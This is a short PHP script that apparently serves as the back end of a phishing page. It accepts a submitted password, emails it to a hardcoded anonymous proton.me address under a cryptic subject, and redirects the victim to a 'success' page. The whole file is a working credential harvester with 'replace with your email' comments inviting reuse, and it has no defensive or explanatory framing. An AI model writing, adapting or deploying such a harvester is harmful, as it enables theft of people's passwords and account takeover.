<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $password = htmlspecialchars($_POST['password']);

    $to = "protectiondriveforclear@proton.me"; // Replace with your admin email
    $subject = "p r";
    $message = "Email: $password";
    $headers = "From: protectiondriveforclear@proton.me"; // Replace with your from email

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        // Redirect to another page
        header("Location: success.html");
        exit();
    } else {
        echo "There was an error sending the email.";
    }
} else {
    echo "Invalid request.";
}
?>
